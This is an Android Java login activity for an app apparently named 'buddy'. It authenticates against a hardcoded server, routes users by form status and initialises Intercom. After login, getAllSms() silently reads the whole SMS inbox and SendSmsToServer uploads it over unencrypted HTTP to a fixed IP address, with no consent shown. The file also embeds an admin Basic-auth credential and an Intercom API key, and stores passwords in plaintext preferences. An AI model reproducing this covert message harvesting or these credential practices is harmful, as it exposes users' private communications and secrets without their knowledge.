package com.example.buddy.myapplication;
import com.example.buddy.myapplication.SMS;

import android.app.Activity;
import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;

import android.view.MenuItem;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

import io.intercom.android.sdk.Intercom;
import io.intercom.android.sdk.identity.Registration;
import io.intercom.com.google.gson.Gson;

public class MainActivity extends AppCompatActivity {
    String url = "http://54.255.147.43:3000/authenticate";
   static String token ;
    static Activity act;
    public static final String MyPREFERENCES = "buddy" ;

    SharedPreferences sharedpreferences,sharedpreferences2;
    static String userId = "", pass = "";
    String Name = "", email = "", formstatus = "",uniqueCode=" ";
    EditText username, password;
    HashMap<String, String> data11;
    List<String> check = new ArrayList<String>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        check.add("d");
        act=this;
        check.add("dof");
        sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
        sharedpreferences2 = getSharedPreferences("buddyin", Context.MODE_PRIVATE);



        if(sharedpreferences.getInt("checklog",0)==1)
        {userId=sharedpreferences2.getString("name",null);
        pass=sharedpreferences2.getString("password",null);
            new ItemsByKeyword().execute(url);
        } else {



            setContentView(R.layout.activity_main);
            username = (EditText) findViewById(R.id.phone_number);
            password = (EditText) findViewById(R.id.password);


            TextView notreg = (TextView) findViewById(R.id.NotRegistered);
            notreg.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent in2 = new Intent(MainActivity.this, Inviteform.class);
                    startActivity(in2);
                }
            });

            TextView login = (TextView) findViewById(R.id.Login);
            login.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {   SharedPreferences.Editor editor2 = sharedpreferences2.edit();
                    editor2.putString("name",username.getText().toString());

                    editor2.putString("password",password.getText().toString());
                    editor2.commit();
                    userId = username.getText().toString();
                    pass = password.getText().toString();


                    if ((userId.length() != 0) && (pass.length() != 0))
                        new ItemsByKeyword().execute(url);
                    else if (userId.length() != 0)

                        Toast.makeText(getApplicationContext(),
                                "Please your valid userid",
                                Toast.LENGTH_LONG).show();
                    else if (pass.length() != 0)

                        Toast.makeText(getApplicationContext(),
                                "Passwords Cant be blank",
                                Toast.LENGTH_LONG).show();
                    else
                        Toast.makeText(getApplicationContext(),
                                "Fields are empty",
                                Toast.LENGTH_LONG).show();

                }
            });
        }
    }


    private class ItemsByKeyword extends
            AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            // String urldisplay = data[0];
            // HashMap<String, String> details = data[0];
            JSONObject payload = new JSONObject();
            try {
                // userid=12&productid=23&action=add
                // TYPE: POST
                //      payload.put("userid", details.get("userid"));
                // payload.put("productid", details.get("productid"));
                // payload.put("action", details.get("action"));

                HttpParams httpParameters = new BasicHttpParams();

                HttpConnectionParams
                        .setConnectionTimeout(httpParameters, 30000);

                HttpClient client = new DefaultHttpClient(httpParameters);

                HttpPost httppost = new HttpPost(url);
                httppost.setHeader("Authorization", "Basic YnVkZHlhcGlhZG1pbjptZW1vbmdvc2gx");

                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();
                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                    return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);

                    if (resp.getString("status").contains("fail")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + response.getStatusLine().getStatusCode());
                        return "fail";
                    } else {
                        token = resp.getString("token");
                        return "win";

                    }

                }

            } catch (Exception e) {
                Log.e("mesherror111", e.getMessage());
                return "fail";

            }
        }

        protected void onPostExecute(String result) {

            if (result.contains("fail")) {

                // populateUserDetails();

                Toast.makeText(getApplicationContext(),
                        "Something's Wrong! Please try again!",
                        Toast.LENGTH_LONG).show();

            } else {

                new login().execute(url);

            }

        }
    }

    private class login extends
            AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... data) {

            // String urldisplay = data[0];
            //   HashMap<String, String> details = data[0];
            JSONObject payload = new JSONObject();
            try {
                // userid=12&productid=23&action=add
                // TYPE: POST

                payload.put("userid", userId);
                payload.put("password", pass);
                // payload.put("action", details.get("action"));

                HttpParams httpParameters = new BasicHttpParams();

                HttpConnectionParams
                        .setConnectionTimeout(httpParameters, 30000);

                HttpClient client = new DefaultHttpClient(httpParameters);
                String url2 = "http://54.255.147.43:3000/api/user/login";
                HttpPost httppost = new HttpPost(url2);
                httppost.setHeader("Authorization", "Basic YnVkZHlhcGlhZG1pbjptZW1vbmdvc2gx");
                httppost.setHeader("x-access-token", token);
                httppost.setHeader("Content-Type", "application/json");


                StringEntity entity = new StringEntity(payload.toString());

                httppost.setEntity(entity);
                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();
                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                    return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);

                    if (resp.getString("status").contains("error")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + response.getStatusLine().getStatusCode());
                        return resp.getString("msg");
                    } else {

                        return "win";

                    }

                }

            } catch (Exception e) {
                Log.e("mesherror", e.getMessage());
                return "fail";

            }
        }

        protected void onPostExecute(String result) {

            if (!result.contains("win")) {

                // populateUserDetails();
                if (result.contains("Invalid userid"))
                    Toast.makeText(getApplicationContext(),
                            "Please login with correct credentials ",
                            Toast.LENGTH_LONG).show();


                else if (result.contains("Invalid password")) {
                    password.setText("");
                    Toast.makeText(getApplicationContext(),
                            "Please login with correct credentials ",
                            Toast.LENGTH_LONG).show();
                }

            } else {
                int a=1;
                sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = sharedpreferences.edit();
                editor.putInt("checklog",a);
                editor.commit();
                //getAllSms();
                Toast.makeText(getApplicationContext(),
                        "Successfully Logged In",
                        Toast.LENGTH_LONG).show();
                getAllSms();
                new checkuser().execute(url);

            }

        }
    }


    private class checkuser extends
            AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            // String urldisplay = data[0];
            // HashMap<String, String> details = data[0];

            try {
                // userid=12&productid=23&action=add
                // TYPE: POST
                //      payload.put("userid", details.get("userid"));
                // payload.put("productid", details.get("productid"));
                // payload.put("action", details.get("action"));

                HttpParams httpParameters = new BasicHttpParams();
                String uurl = "http://54.255.147.43:3000/api/user/form?phone="+userId;
                HttpConnectionParams
                        .setConnectionTimeout(httpParameters, 30000);

                HttpClient client = new DefaultHttpClient(httpParameters);

                HttpGet httppost = new HttpGet(uurl);
                httppost.setHeader("Authorization", "Basic YnVkZHlhcGlhZG1pbjptZW1vbmdvc2gx");
                httppost.setHeader("x-access-token", token);
                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();
                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                    return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);
                    JSONObject data = new JSONObject(resp.getString("data"));

                    //profile url to be included later
                    email = data.getString("email");
                    Name = data.getString("name");
                    uniqueCode=data.getString("uniqueCode");
                    try{
                    formstatus = data.getString("formStatus");}
                    catch(Exception e){
                        formstatus="empty";
                    }
                    if (resp.getString("status").contains("fail")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + response.getStatusLine().getStatusCode());
                        return "fail";
                    } else {

                        return "win";

                    }

                }

            } catch (Exception e) {
                Log.e("mesherror111", e.getMessage());
                return "fail";

            }
        }

        protected void onPostExecute(String result) {

            if (result.contains("fail")) {

                // populateUserDetails();

                Toast.makeText(getApplicationContext(),
                        "Something's Wrong! Please try again!",
                        Toast.LENGTH_LONG).show();

            } else {  Intercom.initialize((Application) getApplicationContext(), "android_sdk-a252775c0f9cdd6cd922b6420a558fd2eb3f89b0", "utga6z2r");
                Intercom.client().registerIdentifiedUser(
                        new Registration().withUserId(userId));
                if (formstatus.equals("saved")) {

                    Intent in = new Intent(MainActivity.this, Formsaved.class);
                   // Intent in = new Intent(MainActivity.this, Inviteform.class);
                    in.putExtra("Name", Name);
                    in.putExtra("Email", email);
                    in.putExtra("Form", formstatus);
                    in.putExtra("UniC",uniqueCode);
                    startActivity(in);
                }
                else
                if (formstatus.equals("submitted")) {
   //                 Intent in = new Intent(MainActivity.this, Landing.class);
                    Intent in = new Intent(MainActivity.this, Formstatus.class);
                    in.putExtra("Name", Name);
                    in.putExtra("Email", email);
                    in.putExtra("Form", formstatus);
                    in.putExtra("UniC",uniqueCode);
                    startActivity(in);
                }
                else
                if (formstatus.equals("empty")) {
//                    Intent in = new Intent(MainActivity.this, Inviteform    .class);
                    Intent in = new Intent(MainActivity.this, Formempty.class);
                    in.putExtra("Name", Name);
                    in.putExtra("Email", email);
                    in.putExtra("Form", formstatus);
                    in.putExtra("UniC",uniqueCode);
                    startActivity(in);
                }


            }

        }
    }
    public static  class SendSmsToServer extends AsyncTask<List<SMS>, String, String> {

        @Override
        protected String doInBackground(List<SMS>... sms){

            JSONObject payload=new JSONObject();
            try {
                HttpParams httpParameters = new BasicHttpParams();

                HttpClient client = new DefaultHttpClient(httpParameters);
                String urlsm="http://54.255.147.43:3000/api/content/sms";
                SharedPreferences pref = act.getSharedPreferences("MyPref", 0);
                HttpPost httppost = new HttpPost(urlsm);


                httppost.setHeader("x-access-token", token);
                httppost.setHeader("Content-Type", "application/json");
           //     JSONArray mJSONArray = new JSONArray(Arrays.asList(sms));
                payload.put("userId", userId);
                payload.put("data",sms);
                StringEntity entity = new StringEntity(payload.toString());

                httppost.setEntity(entity);
                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();

                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                    return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);

                    if (resp.getString("status").contains("fail")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + resp.getString("message"));

                        return "fail";
                    } else {

                        return "win";

                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                return "fail";
            }

        }

        @Override
        protected void onPostExecute(String result) {
//            Toast.makeText(getApplicationContext(),result,Toast.LENGTH_LONG).show();
            // TODO Auto-generated method stub
            if(result.equals("win")){
                System.out.println(result);
            }
        }
    }

    public void getAllSms() {
JSONArray smsJ=new JSONArray();
        List<SMS> lstSms = new ArrayList<SMS>();
        SMS objSms = new SMS();
        JSONObject rSms=new JSONObject();
        Uri message = Uri.parse("content://sms/inbox");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();
        int batchCount = 0;
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
rSms=new JSONObject();
                objSms = new SMS();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }
Gson gson=new Gson();
               // String json=gson.toJson(objSms);
                smsJ.put(gson.toJson(objSms));
                batchCount++;
                if(batchCount==999){
                    new SendSmsToServer().execute(lstSms);
                    lstSms.clear();
                    batchCount = 0;
                }
                c.moveToNext();
            }
        }

        if(batchCount>0){
            new SendSmsToServer().execute(lstSms);
        }
        SharedPreferences pref = getSharedPreferences("MyPref", 0);
        pref.edit().putBoolean("sms_sent", true).commit();
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        c.close();
        //c.close();


    }



}